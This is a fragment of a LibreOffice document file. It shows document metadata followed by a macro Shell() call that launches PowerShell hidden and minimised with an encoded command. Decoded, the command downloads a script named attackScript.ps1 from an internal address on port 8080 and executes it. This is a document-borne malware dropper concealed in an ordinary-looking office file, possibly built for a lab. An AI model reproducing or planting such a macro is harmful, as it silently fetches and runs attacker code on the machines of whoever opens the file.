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09:30:59.096796863</meta:creation-date>
    <meta:generator>LibreOffice/7.0.4.2$Windows_x86 LibreOffice_project/dcf040e67528d9187c66b2379df5ea4407429775</meta:generator>
    <dc:date>2023-03-14T22:07:26.342000000</dc:date>
    <meta:editing-duration>PT12M14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Shell("cmd.exe /MIN /C ",0,"powershell.exe -nop -w hidden -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADIALgA0ADoAOAAwADgAMAAvAGEAdAB0AGEAYwBrAFMAYwByAGkAcAB0AC4AcABzADEAJwApAA==",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